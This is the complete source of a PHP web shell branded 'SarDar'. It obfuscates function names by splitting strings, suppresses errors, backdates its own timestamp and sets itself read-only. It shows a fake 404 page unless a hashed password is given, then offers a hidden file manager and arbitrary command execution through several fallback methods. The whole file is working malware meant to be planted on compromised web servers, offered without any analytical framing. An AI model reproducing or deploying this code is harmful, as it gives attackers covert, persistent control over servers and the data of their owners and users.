<?php


$fff = 'er'.'ror'.'_r'.'epo'.'rting';

$fff(0);


$fff1 = 'ht'.'tp_'.'res'.'pons'.'e_c'.'ode';

$fff1(404);

$tti = 'tou'.'ch';

$tti2 = 'str'.'tot'.'ime';

$tti(__FILE__, $tti2('-90 month'));

$ccc = 'chm'.'od';

$ccc(__FILE__, 0444);

$ps = 'b4f945433ea4c369c12741f62a23ccc0'; //sar

$pas = $_GET['pass'];

$gww = 'ge'.'tc'.'wd';

$pu1 = 'fi'.'le_p'.'ut_con'.'te'.'nts';

$mov1 = 'mo'.'ve_u'.'plo'.'ade'.'d_f'.'ile';

$mov2 = 'co'.'py';

$ge1 = 'fi'.'le_g'.'et_con'.'ten'.'ts';

$un1 = 'unl'.'ink';

$mm5 = 'm'.'d5';

$chkir = 'ch'.'d'.'ir';

$rn1 = 'ren'.'ame';

$e1 = 'e'.'xp'.'lo'.'de';

$se1 = 'se'.'tco'.'ok'.'ie';

$rd1 = 'r'.'md'.'ir';

$is1 = 'i'.'s_fi'.'le';

$is2 = 'i'.'s_d'.'ir';

$mk1 = 'mk'.'di'.'r';

$ss1 = 'sc'.'a'.'nd'.'ir';

$ddn = 'd'.'irn'.'am'.'e';

$fo1 = 'fop'.'en';

$fo2 = 'fw'.'ri'.'te';

$fo3 = 'fcl'.'ose';

function cmm($cum, $ch1){
    
    $ggg = 'sy'.'st'.'em';
    
    $ob1 = 'ob_'.'st'.'art';
    
    $ob2 = 'ob_'.'get_c'.'lean';
    
    $ggg2 = 'sh'.'ell'.'_ex'.'ec';
    
    $ggg3 = 'ex'.'ec';
    
    $ggg4 = 'pop'.'en';
    
    $fr1 = 'fr'.'ead';
    
    $pc1 = 'pcl'.'ose';
    
    $ggg5 = 'pas'.'st'.'hru';
    
    $pr1 = 'pro'.'c_op'.'en';
    
    $st1 = 'st'.'rea'.'m_get'.'_co'.'nt'.'ents';
    
    $fc1 = 'fcl'.'ose';
    
    $pr2 = 'pr'.'oc_c'.'lose';
    
    
    $des1 = array(
                            0 => array("pipe", "r"),
                            1 => array("pipe", "w")
                            );
    if ($ob1() and $ggg($cum) and $oo=$ob2()){
        $mss = '<h1>Run 1!</h1>';
    }
    
    
    elseif ($oo = $ggg2($cum)){
        $mss = '<h1>Run 2!</h1>';
    }
    elseif ($oo = $ggg3($cum)){
        $mss = '<h1>Run 3!</h1>';
    }
    elseif ($han1 = $ggg4($cum, 'r') and $oo = $fr1($han1, 4096)){
        $mss = '<h1>Run 4!</h1>';
        $pc1($han1);
    }
    elseif ($ob1() and $ggg5($cum) and $oo=$ob2()){
        $mss = '<h1>Run 5!</h1>';
        
        
    }
    elseif ($prr = $pr1($cum, $des1, $pis) and $oo = $st1($pis[1])){
        
        $mss = '<h1>Run 6!</h1>';
        $fc1($pis[1]);
        $pr2($prr); 
                        
                        
    }
    else{
        $mss = '<h3>Not run!</h3>';
        $oo = 'err_or';
    }
    
                            
                                
                         
             
    
    if ($ch1== 1 and !$oo == 'err_or'){
        return 1;
    }
    elseif ($ch1 == 2){
        
        echo $mss;
        return $oo;
    } else {
        return 0;
    
    
    }
}


function dd($n){
    
    return $n>1024?$n>1048576?round($n/1048576,1).'M':round($n/1024,1).'K':$n.'B';
}



if ($_COOKIE['sar'] == $mm5($_SERVER['HTTP_USER_AGENT'])){
    
    if (isset($_GET['c'])){
        if ($_GET['c'] == '' or $_GET['c'] == '/'){
            $c = $gww();
            
        } else{
            $c = $_GET['c'];
        }
        
    } else {
        $c = $gww();
        
    }
    $chkir($c);
   
    

	echo "<!DOCTYPE html><html><head><meta http-equiv='content-type' content='text/html; charset=utf-8'><meta name='viewport' content='width=device-width'><style type='text/css'>
	h1{color: lime; font-size: 1.20rem;}
	h2{color: black}
	h3{color: red}
	tr:nth-child(even){background:#dedede} 
	tr:nth-child(odd){background-color: white;}
	th,td {padding:0.1em 1.0em;}
	th {text-align:left;font-weight:bold;background:#4a4a4a;border-bottom:1px; color:#fbfbfe;}
	#list{border:2px solid #aaa;width:70%;}
	a {color:#a;}
	a:link{color:blue; text-decoration: none;}
	a:hover{color:red;}
</style>
<title>SarDar</title>
</head><body bgcolor=#23222b>";


	$v = $e1("/", $c);
	
	foreach ($v as $va) {
	    
	    $ff .= $va.'/';
	    
	    echo "<a href='?c=".urlencode($ff)."'><span style='color: white; font-size: 150%;'>/".urlencode($va)."</span></a>";
	    
	}
	
	echo "<a href='?c='><span style='color: lime; font-size: 150%;'>&nbsp;&nbsp;[HOME]</span></a><br>";
	
    if(isset($_POST['new_n'])) {
        
        $rn1($_POST['old_n'], $_POST['new_n']);
        
    }
    if (isset($_POST['sub']) and $_POST['sub'] == 'Send'){
        $nff = $_FILES['fifi']['name'];
        $fdat = $_FILES['fifi']['tmp_name'];
        if (!$mov1($fdat, $nff)){
            if (!$mov2($fdat, $nff)){
                if (!$pu1($nff, $ge1($fdat))){
                    if (!$fff = $fo1($nff, 'w') and !$fo2($fff, $ge1($fdat))){
                        echo "<h3>&nbsp;Not Uploaded</h3>";
                        
                        } else {
                    echo "<h1>&nbsp;Uploaded4</h1>";
                    $fo3($fff);
                    
                    
                }
                } else {
                    echo "<h1>&nbsp;Uploaded3</h1>";
                    
                }
            
            } else {
                echo "<h1>&nbsp;Uploaded2</h1>";
            
            }
        } else {
            echo "<h1>&nbsp;Uploaded1</h1>";
            
        }
    
    }
    if (isset($_POST['cme'])){
        
        
        echo "<h1>".cmm($_POST['cme'], 2)."</h1>";
        
    }
    
    if(isset($_POST['edit_n'])) {
        
        if (!$pu1($_GET['ed'], $_POST['edit_n'])){
            if (!$fff = $fo1($_GET['ed'], 'w') and !$fo2($fff, $_POST['edit_n'])){
                if (!cmm('echo "'.$_POST['edit_n'].'" > '.$_GET['ed'], 1)){
                    
                    echo "<h3>&nbsp;Not seve</h3>";
                    
                } else {
                    echo "<h1>&nbsp;Saved3</h1>";
                    
                    
                }
                
                
            } else{
                
                $fo3($fff);
                echo "<h1>&nbsp;Saved2</h1>";
                }
            
            
        } else{
            
            
            echo "<h1>&nbsp;Saved1</h1>";
            }
        
    }
    
    if(isset($_POST['new_f'])){
        
            if (!$pu1($_POST['new_f'], $_POST['edit_f'])){
            if (!$fff = $fo1($_POST['new_f'], 'w') and !$fo2($fff, $_POST['edit_f'])){
                if (!cmm('echo "'.$_POST['edit_f'].'" > '.$_POST['new_f'], 1)){
                    
                    echo "<h3>&nbsp;Not seve</h3>";
                    
                } else {
                    echo "<h1>&nbsp;Saved3</h1>";
                    
                    
                }
                
                
            } else{
                
                $fo3($fff);
                echo "<h1>&nbsp;Save2</h1>";
                }
            
            
        } else{
            
            
            echo "<h1>&nbsp;Saved1</h1>";
            }   
        
        
    }
        
	if (isset($_GET['re'])){
	    if ($is1($_GET['re']) or $is2($_GET['re'])){
	        echo "<br><form action='' method='post'>
  <label style='color: white;'>&nbsp;&nbsp;".urlencode($_GET['re'])."</label>
  <input type='text' name='new_n' placeholder='New name'>
  <input type='hidden' name='old_n' value='".urlencode($_GET['re'])."'>
  <input type='submit' value='Submit'>
</form>";
	        
	    } else { 
	        
	        echo "<h1>&nbsp;Done</h1>";
	        
	    }
    	

    }
    if (isset($_GET['de'])){
        if ($is1($_GET['de'])){
            
            $un1($_GET['de']);
            
            
        } elseif ($is2($_GET['de'])){
            
            $rd1($_GET['de']);
        }
        
        if (!$is1($_GET['de']) or !$is2($_GET['de'])){
            
            echo "<h1>&nbsp;Done</h1>";
        
        }
    }
    
    
    if (isset($_GET['ed'])){
        
        
        echo "<br><form action='' method='post'>
    <textarea name='edit_n' style='width:40%;'>";
        echo htmlspecialchars($ge1($_GET['ed']));
        echo "</textarea><label style='color: white; font-size: 1.20rem;'>&nbsp;&nbsp;".urlencode($_GET['ed'])."</label>
    <input type='submit' value='Save'>
    </form>";
        
        
    }
    
    if (isset($_GET['uu'])){
        echo "<br><form method='post' action='' enctype='multipart/form-data'><input type='file' name='fifi' style='color: white;'><input type='submit' name='sub' value='Send'></form>";
        
    }if (isset($_GET['nww'])){
	    echo "<br><form action='' method='post'>
    <textarea name='edit_f' style='width:40%;'></textarea><label style='color: white; font-size: 1.20rem;'>&nbsp;&nbsp;File name:</label><input type='text' name='new_f' placeholder='name'>
    <input type='submit' value='Save'>
    </form>";
        
	    
	}
	
	if (isset($_GET['cmm'])){
	    echo "<br><form action='' method='post'><label style='color: white; font-size: 1.20rem;'>&nbsp;&nbsp;Run Command: </label>&nbsp;<input type='text' name='cme' placeholder='Enter' style='width:50%'>&nbsp;<input type='submit' value='Run'></form>";
        
	    
	}
	
	if (isset($_GET['di'])){echo "<br><form action='' method='post'><label style='color: white; font-size: 1.20rem;'>&nbsp;&nbsp;New dir: </label>&nbsp;<input type='text' name='dii' placeholder='name' >&nbsp;<input type='submit' value='Make'></form>";
	    
	    if (isset($_POST['dii'])){
	         $mk1($_POST['dii'], 0777);
	        
	    }
	   
	}
	
	
	
	
	echo "<br><a href='?c=".urlencode($c)."&uu=1'><button>Upload</button></a>&nbsp;<a href='?c=".urlencode($c)."&nww=1'><button>New file</button></a>&nbsp;<a href='?c=".urlencode($c)."&di=1'><button>New dir</button></a>&nbsp;<a href='?c=".urlencode($c)."&cmm=1'><button>Command</button></a><br>";
	echo "<br><table id='list'><thead><tr><th style='width:40%'>File Name</th><th style='width:10%'>File Size</th><th style='width:15%'>Date</th><th style='width:15%'>Actions</th></tr></thead>
<tbody><tr><td><a href='?c=".urlencode($ddn($c))."'>Parent directory/</a></td><td>-</td><td>-</td><td>-</td></tr>";
    foreach($ss1($c) as $nam){
        if($nam==='.' or $nam==='..') {
            continue;
            
        }
        
        if ($is1($nam)){
            
            echo "<tr><td><a href='?c=".urlencode($c)."&ed=".urlencode($nam)."'>".$nam."</a></td><td>".dd(filesize($nam))."</td><td>".date("Y/m/d H:i:s", filemtime($nam))."</td><td><a href='?c=".urlencode($c)."&ed=".urlencode($nam)."'>Edit </a><a href='?c=".urlencode($c)."&de=".urlencode($nam)."'> Del </a><a href='?c=".urlencode($c)."&re=".urlencode($nam)."'> Rename</a></td></tr>";
            
        } elseif (is_dir($nam)){
            echo "<tr><td><a href='?c=".urlencode($c)."/".urlencode($nam)."'>".urlencode($nam)."</a></td><td>dir</td><td>".date("Y/m/d H:i:s", filemtime($nam))."</td><td><a href='?c=".urlencode($c)."&re=".urlencode($nam)."'>Rename </a><a href='?c=".urlencode($c)."&de=".urlencode($nam)."'> Del </a><a href='?c=".urlencode($c)."/".urlencode($nam)."'> Open</a></td></tr>";
            
        }
        
        
        
    }
	

} elseif ($mm5($pas) == $ps){

	$se1('sar', $mm5($_SERVER['HTTP_USER_AGENT']));

	echo 'Done';


} else {


echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>';


}


?>
